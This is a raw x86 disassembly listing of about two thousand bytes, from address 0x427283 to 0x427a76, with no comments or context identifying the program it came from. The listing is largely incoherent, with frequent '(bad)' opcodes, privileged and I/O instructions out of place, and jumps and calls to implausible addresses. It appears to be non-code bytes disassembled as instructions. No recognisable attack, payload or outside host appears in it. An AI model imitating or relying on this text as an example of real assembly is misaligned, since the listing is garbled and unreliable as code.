  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
